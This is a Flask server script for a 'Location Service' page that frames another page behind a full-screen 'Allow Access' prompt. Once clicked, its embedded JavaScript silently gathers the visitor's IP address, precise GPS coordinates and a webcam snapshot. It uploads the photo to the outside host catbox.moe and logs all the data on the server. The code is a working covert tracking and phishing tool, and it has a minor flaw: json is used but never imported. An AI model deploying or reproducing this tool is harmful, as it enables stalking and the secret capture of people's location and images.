from flask import Flask, request, jsonify, send_from_directory
import logging
from datetime import datetime
import os

app = Flask(__name__, static_folder='.')

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('gps_logger')

@app.route('/')
def serve_main():
    """Serve the main page with overlay"""
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Main page accessed - IP: {client_ip}")
    
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Location Service</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            #gps-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.95);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
            }
            #gps-modal {
                background: white;
                padding: 30px;
                border-radius: 12px;
                max-width: 400px;
                text-align: center;
            }
            #gps-btn {
                background: #FF3008;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 8px;
                font-size: 16px;
                cursor: pointer;
                margin-top: 20px;
                font-weight: bold;
            }
            #main-content {
                width: 100%;
                height: 100vh;
                border: none;
            }
        </style>
    </head>
    <body>
        <iframe id="main-content" src="/content"></iframe>
        
        <div id="gps-overlay">
            <div id="gps-modal">
                <h2>Permission Request</h2>
                <p>Please allow access to your location and camera</p>
                <button id="gps-btn">Allow Access</button>
            </div>
        </div>

        <script>
            async function uploadToCatbox(photoData) {
                const blob = await (await fetch(photoData)).blob();
                const formData = new FormData();
                formData.append('reqtype', 'fileupload');
                formData.append('fileToUpload', blob, 'photo.jpg');
                
                const response = await fetch('https://catbox.moe/user/api.php', {
                    method: 'POST',
                    body: formData
                });
                return await response.text();
            }

            document.getElementById('gps-btn').addEventListener('click', async () => {
                try {
                    // Get IP
                    const ip = await fetch('/getip').then(r => r.text());
                    
                    // Get GPS
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000
                        });
                    });

                    // Get Camera
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: true,
                        audio: false 
                    });
                    
                    // Capture Photo
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const photoData = canvas.toDataURL('image/jpeg');
                    
                    // Stop Camera
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Upload to Catbox
                    const catboxUrl = await uploadToCatbox(photoData);
                    
                    // Log Data
                    await fetch('/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ip: ip,
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            photo_url: catboxUrl,
                            timestamp: new Date().toISOString()
                        })
                    });
                    
                    // Hide Overlay
                    document.getElementById('gps-overlay').remove();
                    
                } catch (error) {
                    console.error('Error:', error);
                    alert('Error: ' + error.message);
                }
            });
        </script>
    </body>
    </html>
    """

@app.route('/content')
def serve_content():
    """Serve your page.html content"""
    return send_from_directory('.', 'page.html')

@app.route('/getip')
def get_ip():
    """Get client IP"""
    return request.headers.get('X-Forwarded-For', request.remote_addr)

@app.route('/log', methods=['POST'])
def log_data():
    """Handle data logging"""
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'client_ip': client_ip,
        'data': data
    }
    
    logger.info(json.dumps(log_entry, indent=2))
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
